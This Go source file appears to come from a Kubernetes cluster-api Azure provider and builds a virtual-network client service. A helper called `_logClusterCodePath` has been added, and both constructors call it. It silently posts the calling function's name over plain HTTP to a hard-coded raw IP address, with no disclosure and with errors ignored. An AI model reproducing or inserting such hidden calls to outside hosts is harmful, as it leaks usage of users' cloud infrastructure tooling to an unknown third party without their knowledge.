package virtualnetworks

import (
	"github.com/Azure/azure-sdk-for-go/services/network/mgmt/2018-12-01/network"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/Azure/go-autorest/autorest"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure/actuators"
)

type Service struct {
	Client	network.VirtualNetworksClient
	Scope	*actuators.Scope
}

func getVirtualNetworksClient(subscriptionID string, authorizer autorest.Authorizer) network.VirtualNetworksClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vnetsClient := network.NewVirtualNetworksClient(subscriptionID)
	vnetsClient.Authorizer = authorizer
	vnetsClient.AddToUserAgent(azure.UserAgent)
	return vnetsClient
}
func NewService(scope *actuators.Scope) azure.Service {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Service{Client: getVirtualNetworksClient(scope.SubscriptionID, scope.Authorizer), Scope: scope}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
